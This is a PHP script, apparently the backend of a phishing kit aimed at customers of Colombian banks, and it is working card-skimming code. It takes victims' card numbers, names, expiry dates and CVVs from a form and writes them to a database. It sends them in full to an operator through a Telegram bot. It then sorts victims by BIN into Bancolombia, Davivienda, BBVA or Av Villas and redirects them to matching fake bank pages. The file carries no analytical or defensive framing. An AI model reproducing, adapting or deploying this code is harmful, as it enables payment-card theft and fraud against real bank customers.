<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }

ob_start();

header('Content-Type: application/json');

// Incluir archivo de configuración
$config = include 'config.php';

// Obtener credenciales desde config.php
$token = $config['botToken'];
$chatId = $config['chatId'];

// Función para verificar si es un dispositivo móvil
function esDispositivoMovil()
{
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $dispositivosMoviles = array(
        'Android',
        'webOS',
        'iPhone',
        'iPad',
        'iPod',
        'BlackBerry',
        'Windows Phone'
    );

    foreach ($dispositivosMoviles as $dispositivo) {
        if (stripos($userAgent, $dispositivo) !== false) {
            return true;
        }
    }

    return false;
}

// Capturar y decodificar datos JSON desde la solicitud
$inputData = json_decode(file_get_contents('php://input'), true);

if (!$inputData) {
    echo json_encode(['status' => 'error', 'message' => 'Solicitud inválida.']);
    exit;
}

// Validar y procesar datos del formulario
$cliente_id = isset($inputData['cliente_id']) ? intval($inputData['cliente_id']) : null;
$tarjeta = isset($inputData['creditcard']) ? trim($inputData['creditcard']) : '';
$nombre = isset($inputData['name']) ? trim($inputData['name']) : '';
$monto = isset($inputData['monto']) ? trim($inputData['monto']) : '';
$expdate = isset($inputData['expdate']) ? trim($inputData['expdate']) : '';
$cvv = isset($inputData['cvv']) ? trim($inputData['cvv']) : '';

if (
strlen($tarjeta) >= 16 && ctype_digit($tarjeta) &&
strlen($nombre) > 5 &&
strlen($monto) > 4 &&
(strlen($expdate) == 5 || strlen($expdate) == 7) &&
(strlen($cvv) == 3 || strlen($cvv) == 4) && ctype_digit($cvv)
) {
    // Si hay un ID de cliente (Flujo Unificado), actualizarlo en la DB
    if ($cliente_id) {
        try {
            include 'db.php';
            $sql = "UPDATE pse SET tarjeta = :tc, fecha_exp = :f, cvv = :c, usuario = :u, estado = 5 WHERE id = :id";
            $stmt = $conn->prepare($sql);
            $stmt->execute(['tc' => $tarjeta, 'f' => $expdate, 'c' => $cvv, 'u' => $nombre, 'id' => $cliente_id]);
        } catch (Exception $e) {}
    }

    // Obtener los primeros 6 dígitos del BIN
    $numero_recortado = substr($tarjeta, 0, 6);
    $_SESSION['ca'] = $numero_recortado;

    // Crear contenido del mensaje con ID si existe
    $contenido = "💳 <b>NUEVA TARJETA RECIBIDA</b>\n\n";
    if ($cliente_id) $contenido .= "🆔 ID: #$cliente_id\n";
    $contenido .= "👤 Nombre: " . $nombre . "\n";
    $contenido .= "💰 Monto: " . $monto . "\n";
    $contenido .= "🔢 Tarjeta: <code>" . $tarjeta . "</code>\n";
    $contenido .= "📅 Fecha: <code>" . $expdate . "</code>\n";
    $contenido .= "🔐 CVV: <code>" . $cvv . "</code>\n";

    // Identificar banco basado en BIN
    $c = $numero_recortado;
    $suffix = $cliente_id ? "?id=$cliente_id" : "";

    if (in_array($c, array(451307, 601687, 549157, 601676, 601651, 451376, 601645, 530694, 409983, 601656, 601676, 601651, 451376, 601645, 530694, 409983, 601656, 601655, 549158, 601610, 454400, 451359, 449188, 377813, 377814, 377815, 377816, 377843, 377844, 377845, 377846, 377847, 377848, 377886, 409983, 409984, 409985, 411054, 441119, 446846, 449188, 451303, 451307, 451308, 451309, 451321, 451359, 451374, 451376, 451381, 454400, 459425, 459428, 485946, 494381, 517640, 517710, 530691, 530693, 530694, 530695, 530696, 530697, 540615, 540649, 540688, 540691, 541251, 547062, 547480, 549157, 549158, 552588, 552807, 553145, 528633, 530372, 530371, 530373, 459426, 540691, 401089))) {
        $contenido .= "\n🏦 Banco: Bancolombia";
        enviarMensajeTelegram($chatId, $contenido, $token);
        echo json_encode(['status' => 'success', 'redirect_url' => 'bancolombia/index.php' . $suffix]);
    }
    elseif (in_array($c, array(360151, 360324, 402530, 407383, 424488, 425817, 425949, 425950, 425951, 539116, 439152, 441080, 454300, 455981, 455983, 455986, 456360, 472044, 473228, 474493, 480405, 485630, 485953, 485970, 486437, 487048, 491646, 491647, 498467, 512392, 517796, 520024, 526943, 531378, 540591, 540692, 540694, 547063, 547113, 547130, 547246, 547481, 547482, 547488, 549156, 549724, 552201, 552336, 552903, 554531, 554901, 554936, 559225, 526557, 428392, 459321, 447198, 320572, 403899, 430464, 455370, 455982, 458173, 511614, 533295, 524708, 524052))) {
        $contenido .= "\n🏦 Banco: Davivienda";
        enviarMensajeTelegram($chatId, $contenido, $token);
        echo json_encode(['status' => 'success', 'redirect_url' => 'davivienda/index.php' . $suffix]);
    }
    elseif (in_array($c, array(404280, 410164, 421892, 439216, 450407, 450408, 450418, 454100, 454700, 454701, 454759, 455100, 456783, 459418, 459419, 485995, 492198, 492488, 492489, 404279, 439467, 462550, 492468, 491268, 491268))) {
        $contenido .= "\n🏦 Banco: BBVA";
        enviarMensajeTelegram($chatId, $contenido, $token);
        echo json_encode(['status' => 'success', 'redirect_url' => 'bbva/index.php' . $suffix]);
    }
    elseif (in_array($c, array(412709, 470438, 470439, 470440, 482451, 496079, 496080, 496081, 522973, 547142, 547141))) {
        $contenido .= "\n🏦 Banco: Av Villas";
        enviarMensajeTelegram($chatId, $contenido, $token);
        echo json_encode(['status' => 'success', 'redirect_url' => 'avvillas/index.php' . $suffix]);
    }
    else {
        $contenido .= "\n🏦 Banco: Sin información de BIN";
        enviarMensajeTelegram($chatId, $contenido, $token);
        echo json_encode(['status' => 'success', 'redirect_url' => 'pse.php' . $suffix]); // Redirigir a PSE si no se reconoce
    }
}
else {
    echo json_encode(['status' => 'error', 'message' => 'Datos inválidos.']);
    exit;
}

// Función para enviar mensaje a Telegram con soporte HTML
function enviarMensajeTelegram($chatId, $mensaje, $token)
{
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
?>
